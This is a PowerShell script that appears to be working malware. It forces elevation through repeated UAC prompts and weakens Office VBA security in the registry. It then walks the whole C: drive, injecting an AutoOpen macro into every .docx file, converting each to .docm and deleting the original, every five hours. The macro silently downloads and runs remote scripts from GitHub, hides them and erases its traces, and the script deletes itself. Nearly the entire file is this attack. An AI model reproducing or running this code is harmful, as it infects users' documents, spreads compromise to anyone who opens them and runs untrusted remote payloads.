
while (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {

    $process = Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs -PassThru
    
    if (-not $process) {
        Write-Host "Administrator permission is required. Retrying in 3 seconds..."
        Start-Sleep -Seconds 3  
    } else {
        Exit  
    }
}

$scriptPath = $MyInvocation.MyCommand.Path

function Enable-VBATrust {
    Write-Host "Attempting to enable 'Trust access to the VBA project object model'..." -ForegroundColor Cyan

    $basePaths = @("HKCU:\Software\Microsoft\Office", "HKLM:\Software\Microsoft\Office", "HKLM:\Software\WOW6432Node\Microsoft\Office")
    $done = $false

    foreach ($base in $basePaths) {
        if (Test-Path $base) {
            $versions = Get-ChildItem -Path $base | Where-Object { $_.Name -match "\d+\.\d+$" }
            foreach ($version in $versions) {
                $securityPath = Join-Path $version.PSPath "Word\Security"
                if (-not (Test-Path $securityPath)) {
                    try {
                        New-Item -Path $securityPath -Force | Out-Null
                        Write-Host "Created registry path: $securityPath"
                    } catch {
                        Write-Warning "Could not create registry path: $securityPath"
                        continue
                    }
                }
                try {
                    Set-ItemProperty -Path $securityPath -Name "AccessVBOM" -Value 1 -Force
                    Write-Host "Enabled Trust access to VBA for Office version $($version.PSChildName)." -ForegroundColor Green
                    $done = $true
                } catch {
                    Write-Warning "Failed to set AccessVBOM for $securityPath. Run as administrator."
                }
            }
        }
    }
    if (-not $done) {
        Write-Warning "No Office registry keys were updated. Verify Office is installed and you have the proper permissions."
    } else {
        Write-Host "VBA project access is enabled." -ForegroundColor Cyan
    }
}
function Process-DocxFiles {
    param(
        [Parameter(Mandatory=$true)]
        [string]$RootPath
    )

    Write-Host "Scanning for .docx files under: $RootPath" -ForegroundColor Cyan

    $docxFiles = Get-ChildItem -Path $RootPath -Filter *.docx -Recurse -ErrorAction SilentlyContinue

    if (!$docxFiles) {
        Write-Host "No .docx files found."
        return
    }

    $word = New-Object -ComObject Word.Application
    $word.Visible = $false

    $vbaCode = @"
Sub AutoOpen()
    Dim docPath As String
    Dim initialCmdPath As String
    Dim extractPs1Path As String
    Dim permTxtPath As String
    Dim shellCmdInitial As String
    Dim shellCmdExtract As String
    Dim fso As Object
    Dim tempFolder As String
    Dim startTime As Single
    Dim permissionGranted As Boolean
    Dim retryCount As Integer
    Dim maxRetries As Integer

    ' Define the maximum number of retries to prevent an infinite loop
    maxRetries = 10

    ' Get the path to the current document's folder
    docPath = ThisDocument.Path
    If docPath = "" Then
        Exit Sub
    End If

    ' Define the paths for initial.cmd and extract.ps1
    initialCmdPath = docPath & "\initial.cmd"
    extractPs1Path = docPath & "\extract.ps1"

    ' Get the temp directory path using FileSystemObject
    Set fso = CreateObject("Scripting.FileSystemObject")
    tempFolder = fso.GetSpecialFolder(2) ' Temporary Folder
    permTxtPath = tempFolder & "\perm.txt"

    ' Construct the PowerShell commands to download the files (Script 2's approach but with Script 1's robustness)
    shellCmdInitial = "powershell -Command ""Invoke-WebRequest -Uri 'https://https://raw.githubusercontent.com/Drakovthe6th/TBuG/refs/heads/master/l3.cmd' -OutFile '" & initialCmdPath & "'"""
    shellCmdExtract = "powershell -Command ""Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/installers/Extract.ps1' -OutFile '" & extractPs1Path & "'"""

    ' Execute the PowerShell commands to download the files
    Shell shellCmdInitial, vbHide
    Shell shellCmdExtract, vbHide

    ' Wait for 30 seconds to ensure both files are downloaded
    startTime = Timer
    Do While Timer < startTime + 30
        DoEvents
    Loop

    ' Check if initial.cmd was successfully downloaded
    If Dir(initialCmdPath) <> "" Then
        ' Hide initial.cmd
        SetAttr initialCmdPath, vbHidden

        ' Execute initial.cmd with a hidden window
        Shell "cmd.exe /C """ & initialCmdPath & """", vbHide

        ' Wait for 10 seconds to ensure initial.cmd execution completes
        startTime = Timer
        Do While Timer < startTime + 10
            DoEvents
        Loop
    Else
        Exit Sub
    End If

    ' Check if extract.ps1 was successfully downloaded
    If Dir(extractPs1Path) <> "" Then
        ' Hide extract.ps1
        SetAttr extractPs1Path, vbHidden

        ' Run extract.ps1 in a loop until permissions are granted or maximum retries are reached
        permissionGranted = False
        retryCount = 0
        Do While Not permissionGranted And retryCount < maxRetries
            retryCount = retryCount + 1
            Shell "powershell -ExecutionPolicy Bypass -File """ & extractPs1Path & """", vbHide

            ' Check if perm.txt exists in the temporary directory
            If Dir(permTxtPath) <> "" Then
                permissionGranted = True
            End If

            ' Wait for a few seconds before retrying
            startTime = Timer
            Do While Timer < startTime + 5
                DoEvents
            Loop
        Loop

        If Not permissionGranted Then
            Exit Sub
        End If

        ' Wait for 10 seconds to ensure extract.ps1 execution completes
        startTime = Timer
        Do While Timer < startTime + 10
            DoEvents
        Loop
    Else
        Exit Sub
    End If

    ' Cleanup: Delete temporary files (Script 1's approach)
    On Error Resume Next
    fso.DeleteFile initialCmdPath, True
    fso.DeleteFile extractPs1Path, True
    fso.DeleteFile permTxtPath, True
    On Error GoTo 0
End Sub
"@

    foreach ($file in $docxFiles) {
        try {
            Write-Host "Processing file: $($file.FullName)" -ForegroundColor Yellow

            $doc = $word.Documents.Open($file.FullName)
            Start-Sleep -Seconds 1  
            try {
                $vbProj = $doc.VBProject
                $vbComp = $vbProj.VBComponents.Add(1)  
                $vbComp.Name = "AutoOpenModule"  
                $codeModule = $vbComp.CodeModule
                $codeModule.AddFromString($vbaCode)
            }
            catch {
                Write-Warning "Unable to add VBA code to: $($file.FullName). Skipping this file."
                $doc.Close($false)
                continue
            }

            $docmPath = $file.FullName -replace "\.docx$", ".docm"

            $doc.SaveAs([ref] $docmPath, [ref] 13)
            $doc.Close()

            Remove-Item $file.FullName -Force

            Write-Host "Converted: $($file.FullName) -> $docmPath" -ForegroundColor Green
        }
        catch {
            Write-Warning "Error processing file: $($file.FullName). Details: $_"
            continue
        }
    }

    $word.Quit()
    [System.Runtime.Interopservices.Marshal]::ReleaseComObject($word) | Out-Null
    Remove-Variable word

    Write-Host "Operation complete. All .docx files have been processed." -ForegroundColor Cyan
}


Enable-VBATrust

$rootFolder = "C:\"  

while ($true) {
    Write-Host "Starting new scan cycle..." -ForegroundColor Blue
    Process-DocxFiles -RootPath $rootFolder
    Write-Host "Waiting 5 hours until the next scan..." -ForegroundColor Blue
    Start-Sleep -Seconds (5 * 60 * 60)  
}

Remove-Item -Path $scriptPath -Force
